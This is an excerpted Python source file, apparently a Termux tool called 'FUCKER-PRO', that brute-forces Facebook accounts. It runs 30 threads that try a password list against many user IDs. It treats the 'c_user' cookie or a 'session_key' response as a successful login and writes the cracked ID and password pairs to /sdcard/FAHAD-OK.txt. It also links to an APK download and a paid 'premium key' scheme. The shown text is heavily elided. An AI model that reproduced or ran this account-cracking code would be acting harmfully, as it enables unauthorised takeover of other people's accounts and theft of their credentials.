...
os.system('xdg-open https://facebook.com/groups/the.brand.bht/')
...
----------------------------------------------
 ...
 Github    : F4H4D-N0-M0R3
 Facebook  : MD. Abdullah Al Fahad
 Tool Name : FUCKER-PRO
 Type type : FREE
 Version   : 1.9.8
----------------------------------------------
 FUCKER Pro version 1.9.8
 For Hamkers: Hudai lagte ahis na 🐸👍
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/FAHAD_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi FAHAD Sir, I Need To Buy Your Paid FAHAD PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python FAHAD-OLD.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                with tred(max_workers=30) as FAHAD:     
                        ...
                        for psx in user:
                                ...
                                FAHAD.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [FAHAD-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        FAHAD=session.cookies.get_dict().keys()
                        if "c_user" in FAHAD:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [FAHAD-OK] %s | %s'%(ids,pas))
                                open('/sdcard/FAHAD-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in FAHAD:
                                if 'y' in pcp:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [FAHAD-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/FAHAD-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/FAHAD-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
